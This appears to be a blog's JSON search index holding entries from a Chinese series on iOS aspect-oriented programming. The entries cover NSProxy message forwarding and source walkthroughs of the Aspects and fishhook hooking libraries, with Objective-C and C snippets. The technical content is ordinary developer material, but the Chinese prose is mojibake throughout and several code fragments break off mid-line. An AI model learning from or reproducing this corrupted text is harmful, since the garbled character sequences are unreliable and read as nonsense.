[{"categories":["iOS"],"content":" iOS AOPæ–‡ç« ç³»åˆ— å‰å¯¼çŸ¥è¯†ï¼š Mach-Oæ–‡ä»¶ç»“æ„åˆ†æ é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥ OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘ AOPæ¡†æ¶ï¼š Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-30","objectID":"/posts/nsproxy-aop.html:0:0","tags":["iOS","AOP"],"title":"NSProxy AOP","uri":"/posts/nsproxy-aop.html"},{"categories":["iOS"],"content":"ä»‹ç» iOS æœ‰ä¸€ä¸ªåŸç”Ÿçš„ AOP æ–¹æ³•ï¼Œå°±æ˜¯åˆ©ç”¨ NSProxy ä»£ç†ç±»ï¼ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸‹å®˜ç½‘ä»‹ç»ï¼š Typically, a message to a proxy is forwarded to the real object or causes the proxy to load (or transform itself into) the real object. Subclasses of NSProxy can be used to implement transparent distributed messaging (for example, NSDistantObject) or for lazy instantiation of objects that are expensive to create. NSProxy implements the basic methods required of a root class, including those defined in the NSObjectProtocol protocol. However, as an abstract class it doesnâ€™t provide an initialization method, and it raises an exception upon receiving any message it doesnâ€™t respond to. A concrete subclass must therefore provide an initialization or creation method and override the forwardInvocation(_:) and methodSignatureForSelector: methods to handle messages that it doesnâ€™t implement itself. è¯´æ˜ä¸¤ç‚¹ï¼š NSProxy æœ¬èº«å°±æ˜¯ç”¨æ¥åšä»£ç†è½¬å‘æ¶ˆæ¯çš„ NSProxy çš„å­ç±»å¿…é¡»é€šè¿‡ forwardInvocation å’Œ methodSignatureForselector æ¥åˆ›å»ºæ–¹æ³• Note è¿˜è®°å¾—æˆ‘ä»¬åœ¨æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘æ–‡ç« ä¸­æœ€åè®²çš„æ…¢é€Ÿæ¶ˆæ¯è½¬å‘è¿‡ç¨‹å—ï¼Ÿ NSProxy çš„å£°æ˜ï¼š NS_ROOT_CLASS @interface NSProxy \u003cNSObject\u003e { __ptrauth_objc_isa_pointer Class isa; } + (id)alloc; + (id)allocWithZone:(nullable NSZone *)zone NS_AUTOMATED_REFCOUNT_UNAVAILABLE; + (Class)class; - (void)forwardInvocation:(NSInvocation *)invocation; - (nullable NSMethodSignature *)methodSignatureForSelector:(SEL)sel NS_SWIFT_UNAVAILABLE(\"NSInvocation and related APIs not available\"); - (void)dealloc; - (void)finalize; @property (readonly, copy) NSString *description; @property (readonly, copy) NSString *debugDescription; + (BOOL)respondsToSelector:(SEL)aSelector; - (BOOL)allowsWeakReference API_UNAVAILABLE(macos, ios, watchos, tvos); - (BOOL)retainWeakReference API_UNAVAILABLE(macos, ios, watchos, tvos); // - (id)forwardingTargetForSelector:(SEL)aSelector; @end åŒ…å« isa æŒ‡é’ˆï¼Œè¯´æ˜å…¶æœ¬èº«å°±æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚å¹¶ä¸”éµå®ˆ NSObjcet åè®®ï¼Œè¿˜å­˜åœ¨ forwardInvocation å’Œ methodSignatureForSelector æ–¹æ³•ã€‚ ","date":"2021-03-30","objectID":"/posts/nsproxy-aop.html:1:0","tags":["iOS","AOP"],"title":"NSProxy AOP","uri":"/posts/nsproxy-aop.html"},{"categories":["iOS"],"content":"ğŸŒ° ğŸŒ° åœ¨ç›® æ–°å¢ä¸€ä¸ª MyProxy ç±»ç»§æ‰¿ NSProxyï¼Œå¹¶åœ¨å…¶ä¸­å®ç°ä¸€ä¸ªç›®æ ‡å¯¹è±¡çš„ä»£ç†å¼•ç”¨ï¼ŒåŒæ—¶å®ç°ä¸¤ä¸ªå…³é”®æ–¹æ³•: // MyProxy.h @interface MyProxy : NSProxy { id _target; } + (id)proxyWithTarget:(id)target; @end // MyProxy.m @implementation MyProxy + (id)proxyWithTarget:(id)target { MyProxy *mp = [MyProxy alloc]; mp-\u003e_target = target; return mp; } - (NSMethodSignature *)methodSignatureForSelector:(SEL)sel { return [_target methodSignatureForSelector:sel]; } - (void)forwardInvocation:(NSInvocation *)invocation { if (invocation \u0026\u0026 [_target respondsToSelector:invocation.selector]) { NSString *sn = NSStringFromSelector(invocation.selector); NSLog(@\"do something before %@\", sn); [invocation invokeWithTarget:_target]; NSLog(@\"do something after %@\", sn); } } @end // main.m ä¸­æ·»åŠ ä»£ç  // ==== NSProxy ==== Person *p = [MyProxy proxyWithTarget:[[Person alloc] init]]; [p sleep]; [p walk]; ","date":"2021-03-30","objectID":"/posts/nsproxy-aop.html:2:0","tags":["iOS","AOP"],"title":"NSProxy AOP","uri":"/posts/nsproxy-aop.html"},{"categories":["iOS"],"content":"åŸç† proxyWithTarget: å®ç°å°†ä¸€ä¸ªå¯¹è±¡å¼•ç”¨åˆ°è‡ªå®ç°çš„ä»£ç†ç±»ä¸­ï¼Œåœ¨çœŸæ­£è°ƒç”¨å¯¹è±¡æ–¹æ³•æ—¶ï¼Œä»£ç†ç±»æ²¡æœ‰æ–¹æ³•å®šä¹‰ï¼Œæ‰¾ä¸åˆ°å¯¹åº”çš„ IMPï¼Œå°±ä¼šè¿›å…¥æ¶ˆæ¯è½¬å‘æµç¨‹ï¼Œä»è€Œæ‰§è¡Œ forwardInvocation: ï¼Œè€Œæˆ‘ä»¬åœ¨ forwardInvocation: ä¸­æ‰§è¡ŒåŸæ–¹æ³•å‰ååŠ å…¥é¢å¤–é€»è¾‘å®ç° AOPã€‚ è¿™é‡Œä¸ä»…å¯ä»¥æ‰“å°æ–¹æ³•åå’Œä¿®æ”¹æ–¹æ³•é€»è¾‘ï¼Œå› ä¸º NSInvocation ä¸­å°è£…äº†æ–¹æ³•çš„å…¨éƒ¨ä¿¡æ¯ï¼Œå› æ­¤è¿˜èƒ½å¤Ÿæ‰“å°æˆ–ä¿®æ”¹å…¥å‚åŠè¿”å›å€¼ã€‚ ","date":"2021-03-30","objectID":"/posts/nsproxy-aop.html:3:0","tags":["iOS","AOP"],"title":"NSProxy AOP","uri":"/posts/nsproxy-aop.html"},{"categories":["iOS"],"content":" iOS AOPæ–‡ç« ç³»åˆ— å‰å¯¼çŸ¥è¯†ï¼š Mach-Oæ–‡ä»¶ç»“æ„åˆ†æ é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥ OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘ AOPæ¡†æ¶ï¼š Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-29","objectID":"/posts/apsects.html:0:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"ä»‹ç» Think of Aspects as method swizzling on steroids. It allows you to add code to existing methods per class or per instance, whilst thinking of the insertion point e.g. before/instead/after. Aspects automatically deals with calling super and is easier to use than regular method swizzling. ä» Apsects çš„ä»‹ç»å¯ä»¥çœ‹åˆ°åˆ©ç”¨ swizzling æŠ€æœ¯æ¥è¾¾åˆ°ä¸ºç±»æ–¹æ³•æˆ–å®ä¾‹æ–¹æ³•æ·»åŠ é¢å¤–é€»è¾‘ã€‚ä¸”æœ‰ before / instead / after ä¸‰ç§åœºæ™¯ã€‚ è¿˜æ˜¯ä» Demo åˆ°æºç åˆ†æã€‚ Tip å¼ºçƒˆå»ºè®®å…ˆé˜…è¯» æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘ æ–‡ç« æ¥ç†è§£ Runtime åŠ¨æ€æ¶ˆæ¯å‘é€æœºåˆ¶ã€‚ ","date":"2021-03-29","objectID":"/posts/apsects.html:1:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"ç©åçš„ğŸŒ° ç»§ç»­ç”¨ä¹‹å‰çš„ Demoï¼Œæˆ‘ä»¬åœ¨ Method Swizzlingæ–‡ç«  ä¸­æ›¾ç»ä¸º Person ç±»æ‰©å±•äº†ä¸€ä¸ª eat æ–¹æ³•ï¼Œæˆ‘ä»¬ç¨å¾®ä¿®æ”¹ä¸‹ï¼ŒåŠ ä¸ªå…¥å‚ä½†ä¸å¤„ç†ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡ä½¿ç”¨ Apsects hook è¿™ä¸ªå‡½æ•°æ¥æ‰“å°å…¥å‚ food å¹¶åœ¨å‡½æ•°æ‰§è¡Œå®Œæˆåå¯¹ food åšå‡ºè¯„ä»·ï¼š // Person + swizzle.m @implementation Person (swizzle) - (void)eat:(NSString *)food { NSLog(@\"i am eating\"); } @end // main.m // ==== Apsects ==== Person *p = [[Person alloc] init]; // apsects çš„ hook æ¥å£ [p aspect_hookSelector:@selector(eat:) withOptions:AspectPositionAfter usingBlock:^(id\u003cAspectInfo\u003e aspectInfo) { NSLog(@\"%@\", aspectInfo.arguments[0]); NSLog(@\"so delicious!\"); } error:NULL]; [p eat:@\"Mapo Tofu\"]; ","date":"2021-03-29","objectID":"/posts/apsects.html:2:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"æºç åˆ†æ ","date":"2021-03-29","objectID":"/posts/apsects.html:3:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"å…¥å£ /// Adds a block of code before/instead/after the current `selector` for a specific class. /// /// @param block Aspects replicates the type signature of the method being hooked. /// The first parameter will be `id\u003cAspectInfo\u003e`, followed by all parameters of the method. /// These parameters are optional and will be filled to match the block signature. /// You can even use an empty block, or one that simple gets `id\u003cAspectInfo\u003e`. /// /// @note Hooking static methods is not supported. /// @return A token which allows to later deregister the aspect. + (id\u003cAspectToken\u003e)aspect_hookSelector:(SEL)selector withOptions:(AspectOptions)options usingBlock:(id)block error:(NSError **)error { return aspect_add((id)self, selector, options, block, error); } /// @return A token which allows to later deregister the aspect. - (id\u003cAspectToken\u003e)aspect_hookSelector:(SEL)selector withOptions:(AspectOptions)options usingBlock:(id)block error:(NSError **)error { return aspect_add(self, selector, options, block, error); } æ ¹æ®æ³¨é‡Šå¯çŸ¥è¿™é‡Œ usingBlock æ˜¯ hook æ–¹æ³•åè¦ä¿®æ”¹çš„é€»è¾‘ï¼Œå…¥å‚ç¬¬ä¸€ä¸ªid\u003cAspectInfo\u003eï¼Œç¬¬äºŒä¸ªå¼€å§‹æ˜¯åŸæ–¹æ³•å‚æ•°ã€‚è¿”å› AspectToken å¯¹è±¡ã€‚ static id aspect_add(id self, SEL selector, AspectOptions options, id block, NSError **error) { NSCParameterAssert(self); NSCParameterAssert(selector); NSCParameterAssert(block); __block AspectIdentifier *identifier = nil; aspect_performLocked(^{ // 1. åˆ¤æ–­ SEL æ˜¯å¦å…è®¸ hook if (aspect_isSelectorAllowedAndTrack(self, selector, options, error)) { // 2. AspectsContainer \u003c== addAspect:withOption: == AspectIdentifierï¼Œ // åˆ›å»º AspectsContainer ç»“æ„ AspectsContainer *aspectContainer = aspect_getContainerForObject(self, selector); // å°†ä¿¡æ¯æ•´ç†æˆ AspectIdentifier ç»“æ„ identifier = [AspectIdentifier identifierWithSelector:selector object:self options:options block:block error:error]; if (identifier) { // å°† AspectIdentifier åŠ å…¥ AspectsContainer [aspectContainer addAspect:identifier withOptions:options]; // Modify the class to allow message interception. // 3. æ¶ˆæ¯æ‹¦æˆª aspect_prepareClassAndHookSelector(self, selector, error); } } }); return identifier; } ","date":"2021-03-29","objectID":"/posts/apsects.html:3:1","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"1. åˆ¤æ–­æ˜¯å¦èƒ½ hook aspect_isSelectorAllowedAndTrack æºç ä¸è´´äº†ï¼Œä¸»è¦åšé»‘åå•å’Œæ˜¯å¦é‡å¤ hook æ£€æŸ¥ï¼š SEL ä¸èƒ½ä¸º retainã€releaseã€autoreleaseã€forwardInvocation: AspectPositionBefore åœºæ™¯ï¼ŒSEL ä¸èƒ½ä¸º dealloc å¯¹è±¡æˆ–ç±»ä¸­éœ€è¦æ‰¾åˆ° SEL æ£€æŸ¥å­ç±»å’Œçˆ¶ç±»æ˜¯å¦ hook è¿‡ç›®æ ‡æ–¹æ³• ","date":"2021-03-29","objectID":"/posts/apsects.html:3:2","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"2. è®°å½•æ•°æ®ç»“æ„ è¿™é‡Œä¸»è¦è¯´æ˜ä¸¤ä¸ªæ•°æ®ç»“æ„ @interface AspectIdentifier : NSObject + (instancetype)identifierWithSelector:(SEL)selector object:(id)object options:(AspectOptions)options block:(id)block error:(NSError **)error; - (BOOL)invokeWithInfo:(id\u003cAspectInfo\u003e)info; @property (nonatomic, assign) SEL selector; @property (nonatomic, strong) id block; @property (nonatomic, strong) NSMethodSignature *blockSignature; @property (nonatomic, weak) id object; @property (nonatomic, assign) AspectOptions options; @end @interface AspectsContainer : NSObject - (void)addAspect:(AspectIdentifier *)aspect withOptions:(AspectOptions)injectPosition; - (BOOL)removeAspect:(id)aspect; - (BOOL)hasAspects; @property (atomic, copy) NSArray *beforeAspects; @property (atomic, copy) NSArray *insteadAspects; @property (atomic, copy) NSArray *afterAspects; @end AspectIdentifierï¼šåˆ‡é¢ï¼ŒåŒ…å«åˆ‡é¢çš„å…·ä½“å†…å®¹å¦‚æ–¹æ³•ç­¾åã€æ‰§è¡Œæ—¶æœºç­‰ AspectsContainerï¼š åˆ‡é¢å®¹å™¨ï¼Œè£…è½½åˆ‡é¢ ","date":"2021-03-29","objectID":"/posts/apsects.html:3:3","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"3. æ¶ˆæ¯æ‹¦æˆªï¼ˆæ ¸å¿ƒï¼‰ static void aspect_prepareClassAndHookSelector(NSObject *self, SEL selector, NSError **error) { NSCParameterAssert(selector); // a. æ›¿æ¢ forwardInvocation Class klass = aspect_hookClass(self, error); Method targetMethod = class_getInstanceMethod(klass, selector); IMP targetMethodIMP = method_getImplementation(targetMethod); // imp ä¸æ˜¯ _objc_msgForward åˆ™è¿›è¡Œæ–¹æ³•æ›¿æ¢ if (!aspect_isMsgForwardIMP(targetMethodIMP)) { // Make a method alias for the existing method implementation, it not already copied. // b. æ›¿æ¢ _objc_msgForward const char *typeEncoding = method_getTypeEncoding(targetMethod); SEL aliasSelector = aspect_aliasForSelector(selector); if (![klass instancesRespondToSelector:aliasSelector]) { __unused BOOL addedAlias = class_addMethod(klass, aliasSelector, method_getImplementation(targetMethod), typeEncoding); } // We use forwardInvocation to hook in. class_replaceMethod(klass, selector, aspect_getMsgForwardIMP(self, selector), typeEncoding); } } a. æ›¿æ¢forwardInvocation static Class aspect_hookClass(NSObject *self, NSError **error) { Class statedClass = self.class; Class baseClass = object_getClass(self); NSString *className = NSStringFromClass(baseClass); ... // Default case. Create dynamic subclass. // åŠ¨æ€åˆ›å»ºä¸€ä¸ªåç¼€ä¸ºï¼š åŸç±»åçš„ç±» + _Apsects_ const char *subclassName = [className stringByAppendingString:AspectsSubclassSuffix].UTF8String; // è·å– isa Class subclass = objc_getClass(subclassName); if (subclass == nil) { // åŠ¨æ€åˆ›å»ºsubclassç±» subclass = objc_allocateClassPair(baseClass, subclassName, 0); if (subclass == nil) { NSString *errrorDesc = [NSString stringWithFormat:@\"objc_allocateClassPair failed to allocate class %s.\", subclassName]; AspectError(AspectErrorFailedToAllocateClassPair, errrorDesc); return nil; } // swizzle forwardInvocation: aspect_swizzleForwardInvocation(subclass); // ä¿®æ”¹å®ä¾‹å¯¹è±¡æ–¹æ³•å’Œç±»æ–¹æ³•ä¸ºä¹‹å‰çŠ¶æ€ï¼Œä¿è¯è¡Œä¸ºä¸€è‡´ä¸å½±å“å¤–ç•Œä½¿ç”¨ aspect_hookedGetClass(subclass, statedClass); aspect_hookedGetClass(object_getClass(subclass), statedClass); // æ³¨å†Œsubclassç±» objc_registerClassPair(subclass); } // self.isa -\u003e subclass object_setClass(self, subclass); return subclass; } è¿™é‡Œè¿›è¡Œäº†ç¬¬ä¸€æ¬¡ swizzlingï¼Œæ›¿æ¢ forwardInvocation ï¼š static void aspect_swizzleForwardInvocation(Class klass) { // å°† forwardInvocation: æŒ‡å‘è‡ªå®ç°çš„ __ASPECTS_ARE_BEING_CALLED__ IMP originalImplementation = class_replaceMethod(klass, @selector(forwardInvocation:), (IMP)__ASPECTS_ARE_BEING_CALLED__, \"v@:@\"); if (originalImplementation) { // å¢åŠ ä¸€ä¸ªåä¸º __aspects_forwardInvocation: çš„æ–¹æ³•æŒ‡å‘ forwardInvocation: åŸå®ç° class_addMethod(klass, NSSelectorFromString(AspectsForwardInvocationSelectorName), originalImplementation, \"v@:@\"); } } è‡ªå®ç°çš„ __ASPECTS_ARE_BEING_CALLED__ çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯åŒ¹é…ä¸åŒçš„æ‰§è¡Œæ—¶æœºï¼Œç„¶åé€šè¿‡ aspect_invoke å®å®šä¹‰å»æ‰§è¡Œ block ä¸­è‡ªå®šä¹‰çš„é€»è¾‘ã€‚ aspect_invoke è°ƒç”¨ - (BOOL)invokeWithInfo:(id\u003cAspectInfo\u003e)infoï¼Œè¯¥æ–¹æ³•é€šè¿‡å‰é¢è®°å½•çš„æ–¹æ³•ç­¾åå’Œå‚æ•°æ‰§è¡Œ invoke è°ƒç”¨ï¼ˆ[blockInvocation invokeWithTarget:self.block]ï¼‰ static void __ASPECTS_ARE_BEING_CALLED__(__unsafe_unretained NSObject *self, SEL selector, NSInvocation *invocation) { SEL originalSelector = invocation.selector; // SEL æ–°æ–¹æ³•å: alias_åŸselåï¼Œ è¿™ä¸ª aliasSelector åœ¨åè¾¹ SEL swizzle ä¸­åšäº¤æ¢ç”¨åˆ°çš„ SEL aliasSelector = aspect_aliasForSelector(invocation.selector); invocation.selector = aliasSelector; // æ ¹æ® aliasSelector æ‰¾åˆ°å®¹å™¨ AspectsContainer *objectContainer = objc_getAssociatedObject(self, aliasSelector); AspectsContainer *classContainer = aspect_getContainerForClass(object_getClass(self), aliasSelector); AspectInfo *info = [[AspectInfo alloc] initWithInstance:self invocation:invocation]; NSArray *aspectsToRemove = nil; // æ ¹æ®ä¸åŒæ—¶æœºè°ƒç”¨ aspect_invoke // Before hooks. aspect_invoke(classContainer.beforeAspects, info); aspect_invoke(objectContainer.beforeAspects, info); // Instead hooks. ... // After hooks. ... // If no hooks are installed, call original implementation (usually to throw an exception) if (!respondsToAlias) { invocation.selector = originalSelector; SEL originalForwardInvocationSEL = NSSelectorFromString(AspectsForwardInvocationSelectorName); if ([self respondsToSelector:originalForwardInvocationSEL]) { ((void( *)(id, SEL, N","date":"2021-03-29","objectID":"/posts/apsects.html:3:4","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"æ€»ç»“ æ•´ä¸ªæ ¸å¿ƒå®ç°è¿‡ç¨‹ä¸ºï¼š åˆ›å»º subclassï¼Œå¹¶å¤„ç†ä¸ self æŒ‡é’ˆå’Œæ–¹æ³•çš„å…³ç³»ã€‚æ¯æ¬¡éƒ½åˆ›å»º subclass çš„ç›®çš„æ˜¯ä¸ºå•ä¸ªå®ä¾‹å¯¹è±¡å®ç°äº† hook å¤„ç† ï¼Œ è€Œä¸ä¼šå½±å“åˆ°å…¶ä»–åŒç±»çš„å®ä¾‹å¯¹è±¡ ã€‚ äº¤æ¢ __aspects_forwardInvocation:ï¼ˆsubclass ä¸­æ–°åŠ çš„æ–¹æ³•ï¼‰ å’Œ forwardInvocation: å®ç°ï¼ŒforwardInvocation: æŒ‡å‘ apsects å®šä¹‰çš„ __ASPECTS_ARE_BEING_CALLED_ æ¥ invoke ç”¨æˆ·å®šä¹‰çš„ blockã€‚ äº¤æ¢ targetMethod çš„ selector å’Œ aliasSelectorï¼ˆsubclassä¸­æ–°åŠ çš„æ–¹æ³•ï¼‰å®ç°ï¼Œselector æŒ‡å‘ _objc_msgForwardï¼ŒaliasSelector æŒ‡å‘ targetMethod çš„ IMPã€‚ æ›¿æ¢å‰ï¼Œè°ƒç”¨å‡½æ•°è¿›è¡Œæ¶ˆæ¯å‘é€çš„æµç¨‹æ˜¯ï¼štargetMethod_SEL -\u003e objc_msgSend -\u003e _objc_msgForward -\u003e forwardInvocation: -\u003e targetMethod_IMP æ•´ä¸ªæ›¿æ¢åï¼Œæµç¨‹æ˜¯ï¼štargetMethod_SEL -\u003e objc_msgForward -\u003e forwardInvocation: -\u003e ASPECTS_ARE_BEING_CALLED ","date":"2021-03-29","objectID":"/posts/apsects.html:4:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":" iOS AOPæ–‡ç« ç³»åˆ— å‰å¯¼çŸ¥è¯†ï¼š Mach-Oæ–‡ä»¶ç»“æ„åˆ†æ é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥ OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘ AOPæ¡†æ¶ï¼š Method Swizzling Fishhook Apsects NSProxy AOP fishhook æ˜¯ facebook å¼€æºçš„ä¸€æ¬¾ç®€å•æ˜“ç”¨çš„åŠ¨æ€ hook æ¡†æ¶ã€‚ä¸€èµ·å­¦ä¹ ä¸‹å…¶åŸç†ã€‚ ","date":"2021-03-25","objectID":"/posts/fishhook.html:0:0","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"è¿˜æ˜¯é‚£ä¸ªğŸŒ° åœ¨ OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ ä¸­è®²å…ƒç±»çš„æ—¶å€™åˆ†é…æ³¨å†Œäº†ä¸€ä¸ª Student ç±»ï¼Œå¹¶å®ç°äº† study æ–¹æ³•ï¼Œbut å­¦ç”Ÿè¡¨é¢å­¦ä¹ ï¼Œå†…å¿ƒè¿˜æ˜¯å‘å¾€è¯—å’Œè¿œæ–¹ï¼Œå› æ­¤æˆ‘ä»¬æƒ³é€šè¿‡ Fishhook åŠ¨æ€ Hook NSLog ç³»ç»Ÿå‡½æ•°æ¥è¡¨è¾¾å­¦ç”Ÿå…šçš„çœŸå®å†…å¿ƒï¼š // main.m void StudyFunction(id self, SEL _cmd) { NSLog(@\"i am studing\"); } // å®šä¹‰å‡½æ•°æŒ‡é’ˆç”¨æ¥ä¿å­˜åŸå§‹å‡½æ•° static void (*orig_nslog)(NSString * format,...); // å®šä¹‰æ–°å‡½æ•°æ‰©å±• NSLog void newNSLog(NSString * format,...) { format = [format stringByAppendingFormat:@\"\\tOS: i want to play!\"]; // è°ƒç”¨åŸå§‹ NSLog orig_nslog(format); } int main(int argc, const char * argv[]) { @autoreleasepool { // === create class ==== // ä¸ºclass pairåˆ†é…å†…å­˜ Class newClass = objc_allocateClassPair([Person class], \"Student\", 0); // ä¸ºæ–°ç±»æ·»åŠ æ–¹æ³• class_addMethod(newClass, @selector(study), (IMP)StudyFunction, \"v@:\"); // æ³¨å†Œç±» objc_registerClassPair(newClass); // åˆ›å»ºå®ä¾‹å¯¹è±¡ id s = [[newClass alloc] init]; // ==== fishhook ==== // é€šè¿‡ rebind_symbols æ¥å£å®ç°å‡½æ•°é‡ç»‘å®šåˆ°è‡ªå®ç°å‡½æ•°ä¸Š rebind_symbols((struct rebinding[1]){\"NSLog\", newNSLog, (void *)\u0026orig_nslog}, 1); [s performSelector:@selector(study)]; } return 0; } Tip éœ€è¦åœ¨å·¥ç¨‹ä¸­é›†æˆ fishhook.h å’Œ fishhook.c æ–‡ä»¶ Fishhook çš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œå®ç°ä¸€ä¸ªæ–°å‡½æ•°å¹¶é€šè¿‡ rebind_symbols æ¥å£å³å¯å®Œæˆé‡ç»‘å®šã€‚è€Œä¸”æˆ‘ä»¬æ³¨æ„åˆ° struct rebinding ç»“æ„ä½“æ˜¯ä¸ªæ•°ç»„ï¼Œè¿˜æ”¯æŒå¤šä¸ªå‡½æ•°çš„ hookã€‚ ","date":"2021-03-25","objectID":"/posts/fishhook.html:1:0","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"æºç åˆ†æ int rebind_symbols(struct rebinding rebindings[], size_t rebindings_nel) { // 1 int retval = prepend_rebindings(\u0026_rebindings_head, rebindings, rebindings_nel); if (retval \u003c 0) { return retval; } // If this was the first call, register callback for image additions (which is also invoked for // existing images, otherwise, just run on existing images if (!_rebindings_head-\u003enext) { // 2 _dyld_register_func_for_add_image(_rebind_symbols_for_image); } else { uint32_t c = _dyld_image_count(); // 3 for (uint32_t i = 0; i \u003c c; i++) { _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i)); } } return retval; } æˆ‘ä»¬å°† rebind_symbols åˆ†ä¸ºä¸‰éƒ¨åˆ† ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:0","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"prepend_rebindings struct rebinding { const char *name; void *replacement; void **replaced; }; struct rebindings_entry { struct rebinding *rebindings; size_t rebindings_nel; struct rebindings_entry *next; }; static struct rebindings_entry *_rebindings_head; static int prepend_rebindings(struct rebindings_entry **rebindings_head, struct rebinding rebindings[], size_t nel) { // å®šä¹‰ rebindings_entry èŠ‚ç‚¹ struct rebindings_entry *new_entry = (struct rebindings_entry *) malloc(sizeof(struct rebindings_entry)); if (!new_entry) { return -1; } // å°† rebindings æ‹·è´åˆ°èŠ‚ç‚¹ä¸­ new_entry-\u003erebindings = (struct rebinding *) malloc(sizeof(struct rebinding) * nel); if (!new_entry-\u003erebindings) { free(new_entry); return -1; } memcpy(new_entry-\u003erebindings, rebindings, sizeof(struct rebinding) * nel); new_entry-\u003erebindings_nel = nel; // ä¾æ¬¡é“¾æ¥èŠ‚ç‚¹ new_entry-\u003enext = *rebindings_head; *rebindings_head = new_entry; return 0; } è¿™éƒ¨åˆ†ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ªé“¾è¡¨æ•°æ®ç»“æ„ï¼Œå°†æ¯æ¬¡ä¼ å…¥çš„ rebindings åŠ å…¥é“¾è¡¨ã€‚ ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:1","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"_dyld_register_func_for_add_image ç¬¬ä¸€è°ƒç”¨ä¼šè¿›å…¥ _dyld_register_func_for_add_image(_rebind_symbols_for_image) é€»è¾‘ï¼Œ /* * The following functions allow you to install callbacks which will be called * by dyld whenever an image is loaded or unloaded. During a call to _dyld_register_func_for_add_image() * the callback func is called for every existing image. Later, it is called as each new image * is loaded and bound (but initializers not yet run). The callback registered with * _dyld_register_func_for_remove_image() is called after any terminators in an image are run * and before the image is un-memory-mapped. */ extern void _dyld_register_func_for_add_image(void (*func)(const struct mach_header* mh, intptr_t vmaddr_slide)) __OSX_AVAILABLE_STARTING(__MAC_10_1, __IPHONE_2_0); æ ¹æ®æ³¨é‡Šï¼Œ_dyld_register_func_for_add_image ä¸»è¦ä½œç”¨æ˜¯ä¸ºé•œåƒæ³¨å†Œå›è°ƒå‡½æ•°ï¼Œå½“é•œåƒåŠ è½½å¹¶æœªåˆå§‹åŒ–æ—¶è°ƒç”¨å›è°ƒå‡½æ•°ã€‚ è¿™é‡Œåˆ¤æ–­ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨ä¼šæ³¨å†Œ _rebind_symbols_for_image å›è°ƒã€‚å¦åˆ™ä¸ºæ¯ä¸ªé•œåƒæ‰§è¡Œ _rebind_symbols_for_imageã€‚ ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:2","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"_rebind_symbols_for_image static void rebind_symbols_for_image(struct rebindings_entry *rebindings, const struct mach_header *header, intptr_t slide) { Dl_info info; if (dladdr(header, \u0026info) == 0) { return; } segment_command_t *cur_seg_cmd; segment_command_t *linkedit_segment = NULL; struct symtab_command* symtab_cmd = NULL; struct dysymtab_command* dysymtab_cmd = NULL; uintptr_t cur = (uintptr_t)header + sizeof(mach_header_t); // éå† Macho-O çš„ Load Commands æ¥æ‰¾åˆ° __LINKEDITã€LC_SYMTABã€LC_DYSYMTAB æ®µ for (uint i = 0; i \u003c header-\u003encmds; i++, cur += cur_seg_cmd-\u003ecmdsize) { cur_seg_cmd = (segment_command_t *)cur; if (cur_seg_cmd-\u003ecmd == LC_SEGMENT_ARCH_DEPENDENT) { if (strcmp(cur_seg_cmd-\u003esegname, SEG_LINKEDIT) == 0) { linkedit_segment = cur_seg_cmd; } } else if (cur_seg_cmd-\u003ecmd == LC_SYMTAB) { symtab_cmd = (struct symtab_command*)cur_seg_cmd; } else if (cur_seg_cmd-\u003ecmd == LC_DYSYMTAB) { dysymtab_cmd = (struct dysymtab_command*)cur_seg_cmd; } } if (!symtab_cmd || !dysymtab_cmd || !linkedit_segment || !dysymtab_cmd-\u003enindirectsyms) { return; } // Find base symbol/string table addresses // 